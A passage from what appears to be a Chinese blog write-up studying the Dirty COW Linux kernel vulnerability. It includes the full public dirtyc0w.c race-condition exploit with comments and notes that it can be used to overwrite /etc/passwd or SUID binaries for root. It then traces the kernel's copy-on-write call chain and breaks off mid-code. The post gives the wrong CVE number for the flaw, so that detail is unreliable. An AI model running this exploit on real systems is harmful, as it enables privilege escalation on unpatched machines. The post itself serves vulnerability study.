<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="è™½ç„¶å­¦äº†ä¸€é˜µå†…æ ¸pwnçš„åˆ©ç”¨ï¼Œä½†æ˜¯æœ€è¿‘ä¸¤æ¬¡æ¯”èµ›éƒ½æ²¡èƒ½åšå‡ºé¢˜æ¥ï¼ˆå¤ªéš¾äº†å§ã„’_ã„’ï¼Œæ„Ÿè§‰æ–°æ‰‹å‹å¥½çš„koé¢˜ä¸ä¼šå†æœ‰äº†ï¼‰ã€‚æˆ‘è¿˜æ˜¯è€è€å®å®åˆ†æåˆ†æCVEï¼Œå­¦å¤šç‚¹æŒ–æ´å’Œåˆ©ç”¨æŠ€å·§å§ğŸ¥¹ã€‚">
<meta property="og:type" content="article">
<meta property="og:title" content="ç»å…¸å†…æ ¸æ¼æ´å¤ç°ä¹‹dirtycow">
<meta property="og:url" content="http://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-analysis/index.html">
<meta property="og:site_name" content="blingbling&#39;s blog">
<meta property="og:description" content="è™½ç„¶å­¦äº†ä¸€é˜µå†…æ ¸pwnçš„åˆ©ç”¨ï¼Œä½†æ˜¯æœ€è¿‘ä¸¤æ¬¡æ¯”èµ›éƒ½æ²¡èƒ½åšå‡ºé¢˜æ¥ï¼ˆå¤ªéš¾äº†å§ã„’_ã„’ï¼Œæ„Ÿè§‰æ–°æ‰‹å‹å¥½çš„koé¢˜ä¸ä¼šå†æœ‰äº†ï¼‰ã€‚æˆ‘è¿˜æ˜¯è€è€å®å®åˆ†æåˆ†æCVEï¼Œå­¦å¤šç‚¹æŒ–æ´å’Œåˆ©ç”¨æŠ€å·§å§ğŸ¥¹ã€‚">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-analysis/image-20230425175820639.png?size=600">
<meta property="article:published_time" content="2023-05-01T18:42:59.000Z">
<meta property="article:modified_time" content="2023-05-01T20:26:46.229Z">
<meta property="article:author" content="blingbling">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-analysis/image-20230425175820639.png?size=600"><title>ç»å…¸å†…æ ¸æ¼æ´å¤ç°ä¹‹dirtycow | blingbling's blog</title><link ref="canonical" href="http://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-analysis/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"80px","tocMaxDepth":3},
  header: {"enable":true,"showOnPost":false,"scrollDownIcon":true},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"dark","wordWrap":false},
  reward: false,
  fancybox: true,
  zoomImage: undefined,
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"å¤åˆ¶","copySuccess":"å¤åˆ¶æˆåŠŸ","copyError":"å¤åˆ¶å¤±è´¥"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner header-inner--height header-inner--bgcolor"><nav class="header-nav header-nav--sticky"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">é¦–é¡µ</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">å½’æ¡£</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">åˆ†ç±»</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">æ ‡ç­¾</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">å…³äº</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friends/"><span class="header-nav-menu-item__icon"><i class="fas fa-thumbs-up"></i></span><span class="header-nav-menu-item__text">å‹é“¾</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">æœç´¢</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">ç»å…¸å†…æ ¸æ¼æ´å¤ç°ä¹‹dirtycow</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">å‘è¡¨äº</span><span class="post-meta-item__value">2023-05-02</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">æ›´æ–°äº</span><span class="post-meta-item__value">2023-05-02</span></span></div></header><div class="post-body">
        <h1 id="dirtycowæ¼æ´åˆ†æ"   >
          <a href="#dirtycowæ¼æ´åˆ†æ" class="heading-link"><i class="fas fa-link"></i></a><a href="#dirtycowæ¼æ´åˆ†æ" class="headerlink" title="dirtycowæ¼æ´åˆ†æ"></a>dirtycowæ¼æ´åˆ†æ</h1>
      <p>CVE-2016-9159ï¼ˆdirtycowï¼‰å—å½±å“çš„å†…æ ¸ç‰ˆæœ¬ï¼šlinux 2.6.22 ~ <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io/wiki/Patched-Kernel-Versions" >patched kernel versions</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://dirtycow.ninja/" >dirtycow</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>è¿™ä¸ªæ¼æ´çš„åŸç†æ¯”è¾ƒå¤æ‚ï¼Œä½†<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c" >å®˜æ–¹exp</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>éå¸¸ç®€å•ã€‚æ‰€ä»¥ä»expå…¥æ‰‹æ¢ç´¢èƒŒåçš„æ¼æ´åŸç†ã€‚</p>
<p>å…ˆç®€å•æè¿°ä¸€ä¸‹è¿™ä¸ªæ¼æ´åšäº†ä»€ä¹ˆï¼š</p>
<p>å¯¹ä¸€ä¸ªåªè¯»çš„<strong>ç§æœ‰æ˜ å°„</strong>ï¼ˆä¸”æ˜¯<strong>æ–‡ä»¶æ˜ å°„</strong>ï¼‰çš„é¡µé¢è¿›è¡Œå†™æ“ä½œï¼ˆé€šè¿‡/proc/self/memå†™ï¼‰æ—¶ï¼Œä¼šè§¦å‘copy-on-writeï¼Œå°†page cacheä¸­çš„å†…å®¹æ‹·è´åˆ°cowé¡µé¢ã€‚</p>
<ul>
<li>æ­£å¸¸æƒ…å†µä¸‹ï¼Œå†™çš„æ˜¯cowé¡µé¢ï¼Œä¸ä¼šåŒæ­¥åˆ°ç£ç›˜æ–‡ä»¶ã€‚</li>
<li>ç„¶è€Œdirtycowæ¼æ´å¯ä»¥ç›´æ¥æ˜ å°„page cacheé¡µé¢å¹¶å†™å…¥ï¼ŒåŸæœ¬çš„<strong>åªè¯»æ–‡ä»¶è¢«æ”¹å†™</strong>äº†ã€‚ï¼ˆå¯ä»¥æ”¹<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://gist.github.com/ngaro/05e084ca638340723b309cd304be77b2" >/etc/passwd</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>æˆ–<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679" >å¸¦suidä½çš„ç¨‹åº</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>æ¥ææƒï¼‰</li>
</ul>

        <h1 id="expåˆ†æ"   >
          <a href="#expåˆ†æ" class="heading-link"><i class="fas fa-link"></i></a><a href="#expåˆ†æ" class="headerlink" title="expåˆ†æ"></a>expåˆ†æ</h1>
      <p>äº§ç”ŸCOWçš„æ–¹å¼æœ‰ä¸¤ç§ï¼Œ<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c" >ä¸€ç§</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>æ˜¯å†™/proc/self/memæ–‡ä»¶ï¼Œ<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c" >å¦ä¸€ç§</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>æ˜¯é€šè¿‡PTRACE_POKEDATAè·¨è¿›ç¨‹å†™ã€‚</p>
<p>è¿™é‡Œä»¥æ¯”è¾ƒç»å…¸çš„å‰è€…ä½œä¸ºåˆ†æå¯¹è±¡ï¼ˆå‰è€…åˆ†ææ˜ç™½äº†ï¼Œåè€…ä¹Ÿå°±èƒ½ç†è§£äº†ï¼‰ï¼Œexpå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="keyword">int</span> f;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"><span class="keyword">char</span> *name;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *str;</span><br><span class="line">  str=(<span class="keyword">char</span>*)arg;</span><br><span class="line">  <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100000000</span>;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    c+=madvise(<span class="built_in">map</span>,<span class="number">100</span>,MADV_DONTNEED);		<span class="comment">// ç«äº‰ç‚¹ï¼šé‡Šæ”¾mapå¯¹åº”ç‰©ç†é¡µï¼Œæ¸…ç©ºé¡µè¡¨</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;madvise %d\n\n&quot;</span>,c);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">procselfmemThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *str;</span><br><span class="line">  str=(<span class="keyword">char</span>*)arg;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>,O_RDWR);		<span class="comment">// æ‰“å¼€/proc/self/memæ–‡ä»¶</span></span><br><span class="line">  <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100000000</span>;i++) &#123;</span><br><span class="line">    lseek(f,(<span class="keyword">uintptr_t</span>) <span class="built_in">map</span>,SEEK_SET);		<span class="comment">// å®šä½åˆ°mapä½ç½®</span></span><br><span class="line">    c+=write(f,str,<span class="built_in">strlen</span>(str));			<span class="comment">// ç«äº‰ç‚¹ï¼šå¾€mapä½ç½®å†™ä¼ å…¥çš„å­—ç¬¦ä¸²</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;procselfmem %d\n\n&quot;</span>, c);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (argc&lt;<span class="number">3</span>) &#123;</span><br><span class="line">  (<span class="keyword">void</span>)<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>,</span><br><span class="line">      <span class="string">&quot;usage: dirtyc0w target_file new_content&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line">  <span class="keyword">pthread_t</span> pth1,pth2;</span><br><span class="line"></span><br><span class="line">  f=open(argv[<span class="number">1</span>],O_RDONLY);		<span class="comment">// argv[1]æ˜¯å¾…å†™çš„åªè¯»æ–‡ä»¶çš„æ–‡ä»¶å</span></span><br><span class="line">  fstat(f,&amp;st);</span><br><span class="line">  name=argv[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>,st.st_size,PROT_READ,MAP_PRIVATE,f,<span class="number">0</span>);		<span class="comment">// å°†æ–‡ä»¶æ˜ å°„åˆ°è¿›ç¨‹å†…å­˜ä¸­</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;mmap %zx\n\n&quot;</span>,(<span class="keyword">uintptr_t</span>) <span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">  pthread_create(&amp;pth1,<span class="literal">NULL</span>,madviseThread,argv[<span class="number">1</span>]);			<span class="comment">// é‡Šæ”¾æ˜ å°„å…³ç³»çš„çº¿ç¨‹</span></span><br><span class="line">  pthread_create(&amp;pth2,<span class="literal">NULL</span>,procselfmemThread,argv[<span class="number">2</span>]);		<span class="comment">// å†™çº¿ç¨‹ï¼Œargv[2]æ˜¯å¾…å†™å…¥çš„å­—ç¬¦ä¸²</span></span><br><span class="line">    </span><br><span class="line">  pthread_join(pth1,<span class="literal">NULL</span>);</span><br><span class="line">  pthread_join(pth2,<span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h1 id="è°ƒç”¨é“¾åˆ†æ"   >
          <a href="#è°ƒç”¨é“¾åˆ†æ" class="heading-link"><i class="fas fa-link"></i></a><a href="#è°ƒç”¨é“¾åˆ†æ" class="headerlink" title="è°ƒç”¨é“¾åˆ†æ"></a>è°ƒç”¨é“¾åˆ†æ</h1>
      <blockquote>
<p>è·Ÿdirtycowæ¼æ´ç›¸å…³çš„ä»£ç ï¼Œä¸»è¦é›†ä¸­åœ¨ä¸‰ä¸ªæ–‡ä»¶ï¼Œè¿™é‡Œæ‰“åŒ…ä¿å­˜ä¸€ä¸‹ï¼š<a href="dirtycow_src.zip">dirtycow_src</a>ï¼Œæ ¹æ®ç½‘ä¸Šèµ„æ–™å’Œè‡ªå·±çš„ç†è§£åŠ äº†æ³¨é‡Šï¼Œæ–¹ä¾¿åç»­å›é¡¾æ›´æ”¹ã€‚</p>
</blockquote>
<p>å¯¹<code>/proc/self/mem</code>æ–‡ä»¶çš„è¯»å†™æ“ä½œï¼Œå¯¹åº”åˆ°fd/proc/base.cæ–‡ä»¶ä¸­çš„proc_mem_operations</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">proc_mem_operations</span> =</span> &#123;</span><br><span class="line">	.llseek		= mem_lseek,</span><br><span class="line">	.read		= mem_read,</span><br><span class="line">	.write		= mem_write,</span><br><span class="line">	.open		= mem_open,</span><br><span class="line">	.release	= mem_release,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>
<p>dirtycowçš„åˆ©ç”¨ä¸­ï¼Œä½¿ç”¨çš„æ˜¯å¾€<code>/proc/self/mem</code>æ–‡ä»¶å†™ï¼Œå¯¹åº”åˆ°å†…æ ¸çš„å¤„ç†å‡½æ•°ä¸º<code>mem_write()</code>ï¼Œå› æ­¤æˆ‘ä»¬è·Ÿç€å®ƒä¸€æ­¥æ­¥åˆ†æï¼Œæ¢³ç†å‡ºå‡½æ•°è°ƒç”¨é“¾ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mem_write(struct file *file, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *ppos)</span><br><span class="line">  mem_rw(file, (<span class="keyword">char</span> __user*)buf, count, ppos, <span class="number">1</span>);</span><br><span class="line">    access_remote_vm(mm, addr, page, this_len, write);</span><br><span class="line">      __access_remote_vm(<span class="literal">NULL</span>, mm, addr, buf, len, write);</span><br><span class="line">        get_user_pages_remote(tsk, mm, addr, <span class="number">1</span>, write, <span class="number">1</span>, &amp;page, &amp;vma);</span><br><span class="line">          __get_user_pages_locked(tsk, mm, start, nr_pages, write, force, pages, vmas, <span class="literal">NULL</span>, <span class="literal">false</span>,FOLL_TOUCH | FOLL_REMOTE);</span><br><span class="line">            __get_user_pages(tsk, mm, start, nr_pages, flags, pages, vmas, locked);</span><br><span class="line">              find_extend_vma(mm, start);				<span class="comment">// æŸ¥æ‰¾vma</span></span><br><span class="line">              follow_page_mask(vma, start, foll_flags, &amp;page_mask);		<span class="comment">// é‡ç‚¹</span></span><br><span class="line">              faultin_page(tsk, vma, start, &amp;foll_flags, nonblocking);		<span class="comment">// é‡ç‚¹</span></span><br></pre></td></tr></table></div></figure>
<p><code>follow_page_mask()</code>ï¼šæŸ¥è¯¢é¡µè¡¨è·å–è™šæ‹Ÿåœ°å€å¯¹åº”çš„ç‰©ç†é¡µï¼Œå¦‚æœè¿”å›NULLåˆ™è°ƒç”¨<code>faultin_page()</code>è¿›è¡Œç¼ºé¡µå¤„ç†ã€‚æœ‰ä¸¤ç§æƒ…å†µä¼šè¿”å›NULLï¼Œå¯¼è‡´è§¦å‘<code>faultin_page()</code>å‡½æ•°ï¼š</p>
<ol>
<li>é¡µè¡¨ä¸­ä¸å­˜åœ¨ç‰©ç†é¡µå³ç¼ºé¡µ</li>
<li>è®¿é—®è¯­ä¹‰æ ‡å¿—foll_flagså¯¹åº”çš„æƒé™è¿åå†…å­˜é¡µçš„æƒé™æ—¶</li>
</ol>
<p>ä»¥ä¸Šä¸¤ç§æƒ…å†µå†dirtycowçš„åˆ©ç”¨ä¸­éƒ½ä¼šå‘ç”Ÿï¼Œå› æ­¤<code>follow_page_mask()</code>å’Œ<code>faultin_page()</code>ä¸¤ä¸ªå‡½æ•°ä¼šè¢«åå¤è°ƒç”¨ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æŒ‰ç…§æ—¶é—´å…ˆåé¡ºåºï¼Œåˆ†æè¿™å®ƒä»¬æ›´æ·±å±‚æ¬¡çš„å‡½æ•°è°ƒç”¨è¿‡ç¨‹ã€‚</p>
<p>åˆšå¼€å§‹åˆ†æå†…æ ¸çš„åŒå­¦å¯ä»¥ç»“åˆ <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/11/18/race/#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3" >xuanxuanåšå®¢</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> ä¸­çš„å›¾ç‰‡æ¥ç†è§£ï¼Œç”»çš„éå¸¸æ£’ï¼</p>

        <h2 id="ç¬¬ä¸€æ¬¡"   >
          <a href="#ç¬¬ä¸€æ¬¡" class="heading-link"><i class="fas fa-link"></i></a><a href="#ç¬¬ä¸€æ¬¡" class="headerlink" title="ç¬¬ä¸€æ¬¡"></a>ç¬¬ä¸€æ¬¡</h2>
      <blockquote>
<p>ç¬¬ä¸€æ¬¡è¿› <code>follow_page_mask()</code>ï¼Œç”±äºé¡µè¡¨é¡¹å’Œé¡µè¡¨éƒ½æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥è¿”å›NULLï¼Œè§¦å‘<code>faultin_page()</code>è¿›è¡Œç¼ºé¡µé”™è¯¯å¤„ç†ã€‚</p>
<p><code>faultin_page()</code>ä¸­ï¼Œæ ¹æ®è®¿é—®flagsï¼ˆFOLL_WRITEï¼‰å’Œmmapç±»å‹ï¼ˆVM_PRIVATEï¼Œæ–‡ä»¶æ˜ å°„ï¼‰ï¼Œåœ¨ç‰©ç†å†…å­˜ä¸Šå°†page_cacheåšäº†ä¸€ä»½æ‹·è´ï¼ˆCOWï¼‰ã€‚å¹¶ä½¿ç”¨åè€…å»ºç«‹é¡µè¡¨ï¼Œæ˜ å°„ç»™è¿›ç¨‹ä½¿ç”¨ã€‚</p>
</blockquote>
<p> <code>follow_page_mask()</code>å‡½æ•°ä¸­è°ƒç”¨é“¾å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">follow_page_mask(vma, start, foll_flags, &amp;page_mask);</span><br><span class="line">  pgd_offset(mm, address);</span><br><span class="line">  pud_offset(pgd, address);</span><br><span class="line">  pmd_offset(pud, address);			<span class="comment">// ä¾æ¬¡è§£æå„çº§é¡µç›®å½•è¡¨ï¼Œå¦‚æœæŸçº§é¡µç›®å½•è¡¨ä¸ºç©ºï¼Œä¼šç›´æ¥è¿”å›NULL</span></span><br><span class="line">  follow_page_pte(vma, address, pmd, flags);</span><br><span class="line">  	pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line">  	pte_present(pte);			<span class="comment">// ç¬¬ä¸€æ¬¡è¿›æ—¶ï¼Œé¡µä¸åœ¨å†…å­˜ä¸­ï¼Œä¸”é¡µè¡¨é¡¹ä¸ºç©º</span></span><br><span class="line">  	<span class="keyword">if</span> (!pte_none(pte))</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></div></figure>
<p>ä»¥ä¸Šå‡½æ•°è¿”å›åï¼Œä¼šç«‹å³è¿›å…¥<code>faultin_page()</code>è¿›è¡Œç¼ºé¡µé”™è¯¯å¤„ç†ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">faultin_page(tsk, vma, start, &amp;foll_flags, nonblocking);</span><br><span class="line">  handle_mm_fault(mm, vma, address, fault_flags);</span><br><span class="line">    __handle_mm_fault(mm, vma, address, flags);</span><br><span class="line">      pgd_offset(mm, address);</span><br><span class="line">      pud_alloc(mm, pgd, address);</span><br><span class="line">      pmd_alloc(mm, pud, address);</span><br><span class="line">      pte_alloc(mm, pmd, address)</span><br><span class="line">      pte_offset_map(pmd, address);			<span class="comment">// å¦‚æœå„çº§é¡µç›®å½•é¡¹ä¸ºç©ºï¼Œåˆ™ä¾æ¬¡ç”³è¯·å’Œè®¾ç½®</span></span><br><span class="line">      handle_pte_fault(mm, vma, address, pte, pmd, flags);</span><br><span class="line">        do_fault(mm, vma, address, pte, pmd, flags, entry);</span><br><span class="line">    	  do_cow_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);		<span class="comment">// å†™æ—¶å¤åˆ¶çš„æ˜ å°„</span></span><br><span class="line">    	    alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);</span><br><span class="line">    	    __do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page);		<span class="comment">// å°†æ–‡ä»¶å†…å®¹è¯»åˆ°fault_pageå¯¹åº”çš„é¡µä¸­ï¼Œç„¶åå†å°†fault_pageçš„å†…å®¹æ‹·è´åˆ°new_pageä¸­ï¼Œç›¸å½“äºcowï¼ˆnew_pageæ˜¯å‰¯æœ¬ï¼‰</span></span><br><span class="line">    	    copy_user_highpage(new_page, fault_page, address, vma);</span><br><span class="line">    	    pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line">    	    do_set_pte(vma, address, new_page, pte, <span class="literal">true</span>, <span class="literal">true</span>);	<span class="comment">// å°†new_pageè®¾ç½®åˆ°é¡µè¡¨é¡¹ä¸­ï¼Œå»ºç«‹new_pageåˆ°addressåœ°å€çš„æ˜ å°„</span></span><br><span class="line">    	      mk_pte(page, vma-&gt;vm_page_prot);</span><br><span class="line">    	      